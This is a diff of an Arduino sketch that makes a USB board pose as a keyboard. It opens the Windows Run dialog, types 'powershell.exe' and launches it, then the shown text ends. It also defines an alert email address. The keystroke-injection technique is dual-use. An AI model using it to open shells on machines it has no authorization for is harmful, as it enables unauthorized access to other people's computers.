@@ -1,20 +1,26 @@
 #include <Arduino.h>
 #include <Keyboard.h>
 
+// IF SOMEONE RE-USE THIS CODE : think on replacing this before anything else ^^'
 #define ALERT_MAIL "\"ulysse31@gmail.com\""
 
 void setup() {
-  // put your setup code here, to run once:
+  // Nothing to do here (at least for now ... ^^')
 }
 
-void loop() {
+void loop()
+{
+  // some delay is needed just to be sure that usb keyboard to gets enabled on Operating system
   delay(1500);
+  // Keyboard library start
   Keyboard.begin();
+  // Launch an execute command window
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(10);
   Keyboard.releaseAll();
   delay(100);
+  // type & launch powershell.exe
   Keyboard.print("powershell.exe");
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
